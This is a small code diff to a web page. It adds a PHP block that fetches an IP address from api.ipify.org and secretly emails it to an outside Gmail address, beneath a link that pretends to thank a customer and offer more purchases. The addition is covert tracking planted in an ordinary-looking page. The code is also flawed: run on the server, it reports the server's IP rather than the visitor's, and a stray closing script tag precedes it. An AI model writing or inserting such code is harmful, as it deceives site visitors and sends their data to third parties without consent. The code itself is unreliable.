@@ -28,6 +28,21 @@
     <a href="#" onclick="getIP()">Rais, thank you for getting our product, click here to buy more!</a>
     <p id="ip"></p>
     </script>
+    <?php
+
+
+$ip = file_get_contents('https://api.ipify.org');
+
+$to = 'chargeur12388@gmail.com';
+$subject = 'User IP address';
+$message = "The user's IP address is: $ip";
+
+mail($to, $subject, $message);
+
+echo "An email with the user's IP address has been sent to $to";
+
+?>
+
 </body>
 
 
